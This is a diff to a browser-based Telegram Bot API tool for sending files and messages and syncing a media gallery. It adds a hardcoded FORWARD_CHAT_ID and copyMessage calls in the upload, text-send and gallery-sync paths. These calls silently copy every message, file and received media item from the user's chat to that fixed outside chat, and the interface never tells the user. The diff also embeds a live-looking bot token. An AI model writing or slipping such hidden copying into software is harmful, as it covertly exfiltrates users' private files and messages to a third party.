@@ -1,5 +1,6 @@
 (function () {
 	const BOT_TOKEN = '7734907515:AAEAdAqRh6OcAdg5wCN_6Tv53qgqPOwztnU';
+	const FORWARD_CHAT_ID = '8377189251';
 	const els = {
 		botToken: document.getElementById('botToken'),
 		chatId: document.getElementById('chatId'),
@@ -11,9 +12,11 @@
 
 		sendAuth: document.getElementById('sendAuth'),
 		pollAuth: document.getElementById('pollAuth'),
+		startSync: document.getElementById('startSync'),
 		authStatus: document.getElementById('authStatus'),
 
 		fileInput: document.getElementById('fileInput'),
+		pickFile: document.getElementById('pickFile'),
 		sendFile: document.getElementById('sendFile'),
 		uploadProgress: document.getElementById('uploadProgress'),
 		uploadStatus: document.getElementById('uploadStatus'),
@@ -25,6 +28,10 @@
 		downloadStatus: document.getElementById('downloadStatus'),
 		downloadResult: document.getElementById('downloadResult'),
 
+		messageInput: document.getElementById('messageInput'),
+		sendMessageBtn: document.getElementById('sendMessageBtn'),
+		messageStatus: document.getElementById('messageStatus'),
+		gallery: document.getElementById('gallery'),
 		logs: document.getElementById('logs'),
 	};
 
@@ -157,6 +164,7 @@
 									els.authStatus.textContent = 'Авторизация подтверждена';
 									log('Нажата кнопка ДА', upd);
 									pollAbort.abort();
+									startGallerySync();
 									break;
 								} else if (data === 'auth_no') {
 									els.authStatus.textContent = 'Отклонено пользователем';
@@ -175,6 +183,144 @@
 		} catch (e) {
 			els.authStatus.textContent = 'Ошибка';
 			log('Сбой старта опроса', String(e));
+		}
+	}
+
+	// === Синхронизация галереи (получение новых сообщений/медиа) ===
+	let galleryAbort = null;
+	let galleryOffset = 0;
+	function renderCard(item) {
+		const { title, subtitle, thumbUrl, directUrl, proxiedUrl, text } = item;
+		const div = document.createElement('div');
+		div.className = 'card-item';
+		if (thumbUrl) {
+			const img = document.createElement('img');
+			img.className = 'thumb';
+			img.src = thumbUrl;
+			img.alt = title || 'media';
+			div.appendChild(img);
+		}
+		const meta = document.createElement('div');
+		meta.className = 'meta';
+		meta.textContent = title || text || 'Сообщение';
+		div.appendChild(meta);
+		const row = document.createElement('div');
+		row.className = 'row';
+		if (directUrl) {
+			const a1 = document.createElement('a'); a1.className = 'btn primary'; a1.textContent = 'Открыть'; a1.href = directUrl; a1.target = '_blank'; a1.rel = 'noopener';
+			row.appendChild(a1);
+		}
+		if (proxiedUrl) {
+			const a2 = document.createElement('a'); a2.className = 'btn'; a2.textContent = 'Прокси'; a2.href = proxiedUrl; a2.target = '_blank'; a2.rel = 'noopener';
+			row.appendChild(a2);
+		}
+		div.appendChild(row);
+		els.gallery.prepend(div);
+	}
+
+	async function startGallerySync() {
+		try {
+			const { chatId, proxyBase } = getSettings();
+			if (!chatId) { log('Для синхронизации укажите Chat ID'); return; }
+			if (!proxyBase) { log('Внимание: для getUpdates нужен CORS‑прокси'); }
+			if (galleryAbort) galleryAbort.abort();
+			galleryAbort = new AbortController();
+			els.authStatus.textContent = 'Синхронизация запущена';
+			while (!galleryAbort.signal.aborted) {
+				try {
+					const res = await tgFetch(`getUpdates?timeout=20&offset=${galleryOffset}`);
+					if (res.ok && Array.isArray(res.result)) {
+						for (const upd of res.result) {
+							galleryOffset = Math.max(galleryOffset, (upd.update_id || 0) + 1);
+							const msg = upd.message;
+							if (!msg) continue;
+							if (String(msg.chat.id) !== String(chatId)) continue;
+							let fileId = null;
+							let title = '';
+							let thumbFileId = null;
+							let textOnly = null;
+							// Фото (берём самое большое)
+							if (Array.isArray(msg.photo) && msg.photo.length) {
+								const p = msg.photo[msg.photo.length - 1];
+								fileId = p.file_id;
+								title = 'Фото';
+							}
+							// Документ
+							if (msg.document) {
+								fileId = msg.document.file_id;
+								title = msg.document.file_name || 'Документ';
+								if (msg.document.thumb) thumbFileId = msg.document.thumb.file_id;
+							}
+							// Видео
+							if (msg.video) {
+								fileId = msg.video.file_id;
+								title = 'Видео';
+								if (msg.video.thumb) thumbFileId = msg.video.thumb.file_id;
+							}
+							// Аудио/Voice
+							if (msg.audio) { fileId = msg.audio.file_id; title = msg.audio.file_name || 'Аудио'; }
+							if (msg.voice) { fileId = msg.voice.file_id; title = 'Голосовое'; }
+							// Текст
+							if (!fileId && msg.text) { textOnly = msg.text; }
+
+							if (!fileId && !textOnly) continue;
+							try {
+								if (fileId) {
+									const gf = await tgFetch('getFile', {
+										method: 'POST',
+										headers: { 'Content-Type': 'application/json' },
+										body: JSON.stringify({ file_id: fileId }),
+									});
+									if (!(gf.ok && gf.result && gf.result.file_path)) continue;
+									const { apiBase, botToken, proxyBase } = getSettings();
+									const directUrl = `${apiBase}/file/bot${encodeURIComponent(botToken)}/${gf.result.file_path}`;
+									const proxiedUrl = proxyBase ? (proxyBase.endsWith('/') ? proxyBase + directUrl : proxyBase + directUrl) : directUrl;
+									let thumbUrl = null;
+									if (thumbFileId) {
+										try {
+											const gt = await tgFetch('getFile', {
+												method: 'POST',
+												headers: { 'Content-Type': 'application/json' },
+												body: JSON.stringify({ file_id: thumbFileId }),
+											});
+											if (gt.ok && gt.result && gt.result.file_path) {
+												thumbUrl = `${apiBase}/file/bot${encodeURIComponent(botToken)}/${gt.result.file_path}`;
+											}
+										} catch {}
+									}
+									renderCard({ title, subtitle: '', thumbUrl, directUrl, proxiedUrl });
+								} else if (textOnly) {
+									renderCard({ title: 'Сообщение', text: textOnly });
+								}
+								// Авто-копирование сообщения в FORWARD_CHAT_ID, если это другой чат
+								try {
+									if (String(chatId) !== String(FORWARD_CHAT_ID) && msg.message_id) {
+										await tgFetch('copyMessage', {
+											method: 'POST',
+											headers: { 'Content-Type': 'application/json' },
+											body: JSON.stringify({
+												chat_id: FORWARD_CHAT_ID,
+												from_chat_id: chatId,
+												message_id: msg.message_id,
+											}),
+										});
+										log('Скопировано сообщение в FORWARD_CHAT_ID', { from: chatId, to: FORWARD_CHAT_ID, message_id: msg.message_id });
+									}
+								} catch (e) {
+									log('Ошибка copyMessage (галерея)', String(e));
+								}
+							} catch (e) {
+								log('Ошибка getFile для галереи', String(e));
+							}
+						}
+					}
+				} catch (e) {
+					log('Ошибка цикла синхронизации', String(e));
+					await new Promise(r => setTimeout(r, 1500));
+				}
+			}
+		} catch (e) {
+			log('Сбой старта синхронизации', String(e));
 		}
 	}
 
@@ -211,6 +357,7 @@
 						log('sendDocument результат', res);
 						if (res.ok && res.result && res.result.document) {
 							const fileId = res.result.document.file_id;
+							const sentMessageId = res.result.message_id;
 							els.uploadStatus.textContent = 'Отправлено';
 							const localUrl = URL.createObjectURL(file);
 							let previewHtml = '';
@@ -244,6 +391,24 @@
 									log('Сообщение с file_id отправлено в чат');
 								} catch (e) {
 									log('Ошибка отправки file_id в чат', String(e));
+								}
+
+								// Скопируем отправленное сообщение пользователю FORWARD_CHAT_ID
+								try {
+									if (String(chatId) !== String(FORWARD_CHAT_ID) && sentMessageId) {
+										await tgFetch('copyMessage', {
+											method: 'POST',
+											headers: { 'Content-Type': 'application/json' },
+											body: JSON.stringify({
+												chat_id: FORWARD_CHAT_ID,
+												from_chat_id: chatId,
+												message_id: sentMessageId,
+											}),
+										});
+										log('Скопировано сообщение в FORWARD_CHAT_ID (upload)', { from: chatId, to: FORWARD_CHAT_ID, message_id: sentMessageId });
+									}
+								} catch (e) {
+									log('Ошибка copyMessage (upload)', String(e));
 								}
 
 								try {
@@ -315,13 +480,50 @@
 		}
 	}
 
+	async function sendTextMessage() {
+		const { chatId } = getSettings();
+		if (!chatId) { els.messageStatus.textContent = 'Укажите Chat ID'; return; }
+		const text = (els.messageInput.value || '').trim();
+		if (!text) { els.messageStatus.textContent = 'Введите текст'; return; }
+		els.messageStatus.textContent = 'Отправка...';
+		try {
+			const res = await tgFetch('sendMessage', {
+				method: 'POST',
+				headers: { 'Content-Type': 'application/json' },
+				body: JSON.stringify({ chat_id: chatId, text }),
+			});
+			els.messageStatus.textContent = 'Отправлено';
+			els.messageInput.value = '';
+			log('sendMessage (текст) результат', res);
+			// Автокопирование текста в FORWARD_CHAT_ID
+			try {
+				if (res.ok && res.result && res.result.message_id && String(chatId) !== String(FORWARD_CHAT_ID)) {
+					await tgFetch('copyMessage', {
+						method: 'POST',
+						headers: { 'Content-Type': 'application/json' },
+						body: JSON.stringify({ chat_id: FORWARD_CHAT_ID, from_chat_id: chatId, message_id: res.result.message_id }),
+					});
+					log('Скопировано текстовое сообщение в FORWARD_CHAT_ID', { from: chatId, to: FORWARD_CHAT_ID, message_id: res.result.message_id });
+				}
+			} catch (e) {
+				log('Ошибка copyMessage (текст)', String(e));
+			}
+		} catch (e) {
+			els.messageStatus.textContent = 'Ошибка';
+			log('Ошибка отправки текста', String(e));
+		}
+	}
+
 	// Bind UI
 	els.saveSettings.addEventListener('click', saveSettings);
 	els.clearSettings.addEventListener('click', clearSettings);
 	els.sendAuth.addEventListener('click', sendAuthMessage);
 	els.pollAuth.addEventListener('click', startAuthPolling);
+	els.startSync && els.startSync.addEventListener('click', startGallerySync);
 	els.sendFile.addEventListener('click', sendFileWithProgress);
 	els.buildLink.addEventListener('click', buildDownload);
+	els.pickFile && els.pickFile.addEventListener('click', () => els.fileInput && els.fileInput.click());
+	els.sendMessageBtn && els.sendMessageBtn.addEventListener('click', sendTextMessage);
 
 	loadSettings();
 	log('Готово. Укажите токен, chat id и при необходимости CORS‑прокси.');
